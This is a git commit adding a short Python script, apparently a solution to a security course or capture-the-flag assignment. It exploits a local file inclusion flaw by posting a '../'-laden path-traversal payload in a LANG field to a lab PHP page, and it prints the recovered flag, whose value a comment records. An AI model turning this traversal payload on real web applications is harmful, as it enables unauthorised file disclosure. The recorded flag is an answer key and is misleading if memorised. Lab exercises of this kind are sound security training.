72d34fb30406ca3877fb0f1a273bb0c1a5b0ac41
Yumingyuan <timdavid@vip.qq.com>
2019-05-22 14:27:57 +0800

    Local File inclusion finish

---
+++ wsb/case25_Local_file_inclusion.py
@@ -0,0 +1,8 @@
+import requests
+import re
+request_url="http://www.wsb.com/Assignment2/case25.php"
+payload_data={"LANG":"../../../../../../../../../var/www/html/Assignment2/lfi.txt"}
+r=requests.post(request_url,data=payload_data)
+re_result=re.findall("The flag is (.*)",r.text)
+print("The flag is:"+re_result[0])
+#The flag is urF8uDT7HnnFZTd
